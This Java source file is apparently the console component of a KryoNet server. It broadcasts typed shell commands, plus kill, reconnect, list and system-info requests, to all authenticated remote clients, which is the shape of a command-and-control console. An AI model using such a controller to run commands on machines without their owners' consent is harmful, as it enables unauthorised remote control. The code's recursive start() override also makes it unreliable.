import com.esotericsoftware.kryonet.Connection;

import java.util.Scanner;

public class InputListener extends Thread {
    /*
    Scans for input in console in a new thread.
     */
    Scanner reader = new Scanner(System.in);


    public void run() {
        start();


    }

    public void start() {
        sendCommand(getInput());

    }


    private String getInput() {

        return (reader.nextLine());


    }

    private void sendCommand(String input) {
        if (Main.server.getConnections().length < 1) {
            Main.error("There are no active client connections to dispatch commands to");
            start();

        }


        try {
            String ipAddress = Main.getIp();


            for (Connection c : Main.server.getConnections()) {
                if (Main.authenticatedClients.containsKey(c.getRemoteAddressTCP().getAddress().getHostAddress())) {
                    if (input.equals("/KILL")) {
                        c.sendTCP(new KillRequest(false));
                        Main.commandLog("--SENT KILL REQUEST--", c.getRemoteAddressTCP().getAddress().getHostAddress(), Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()));
                        Main.authenticatedClients.remove(c.getRemoteAddressTCP().getAddress().getHostAddress());
                        continue;
                    } else if (input.equals("/LIST")) {
                        System.out.println(Main.ANSI_GREEN+"------ Connection "+c.getID()+" ------");
                        System.out.println(Main.ANSI_RED + "[" + c.getRemoteAddressTCP().getAddress().getHostAddress() + "] " + Main.ANSI_YELLOW + "[" + Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()) + "]");
                        continue;

                    } else if (input.equals("/RECONNECT")) {
                        c.sendTCP(new ReconnectRequest(Main.RECONNECT_REQUEST_TIMEOUT, ipAddress));
                        Main.commandLog("--SENT RECONNECT REQUEST--", c.getRemoteAddressTCP().getAddress().getHostAddress(), Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()));
                        Main.reconnectRequest = true;
                        continue;
                    } else if (input.equals("/INFO") ) {
                        c.sendTCP(new Command("uname -a"));
                        c.sendTCP(new Command("lshw -short"));
                        continue;
                    }


                    c.sendTCP(new Command(input));

                    Main.commandLog(input, c.getRemoteAddressTCP().getAddress().getHostAddress(), Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()));
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        start();


    }


}
